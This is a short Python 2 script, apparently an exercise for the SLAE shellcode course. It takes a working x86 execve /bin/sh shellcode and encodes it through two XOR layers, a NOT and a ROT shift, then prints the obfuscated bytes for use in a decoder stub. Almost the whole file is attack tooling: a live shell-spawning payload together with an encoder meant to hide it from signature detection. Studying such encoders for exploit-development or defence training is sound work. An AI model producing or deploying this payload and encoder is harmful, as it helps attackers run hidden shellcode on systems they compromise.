#!/usr/bin/python
# Multi Encoder
# Uses : XOR ---> XOR ---> NOT ---> ROT
# By: Nipun Jaswal ; SLAE-1080

# EXECVE /bin/sh Shellcode
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
# Configure ROT Shifts
n = 131 #ROT Shift

upper_limit = 256 - n
encoded_shellcode = ""
encoded_shellcode_bytes = []

for x in bytearray(shellcode):
    y = x^0xAA #XOR
    z = y^0xCF # XOR
    z = ~z #NOT
    z = (z & 0xFF) #Removing Negatives
    if z < upper_limit:
        encoded_shellcode += '\\x%02x' % (z + n) #ROT
        encoded_shellcode_bytes.append('0x%02x' % (z + n))
    else:
        encoded_shellcode += '\\x%02x' % (n - 256 + z)
        encoded_shellcode_bytes.append('0x%02x' % (n - 256 + z))
#Joining
copy_data = ','.join(encoded_shellcode_bytes)
print "\nEncoded Shellcode (DEC SEQ: ROT->NOT->XOR->XOR):\n%s\n" % (encoded_shellcode)
print "\nEncoded Shellcode (ASM):\n"+ copy_data
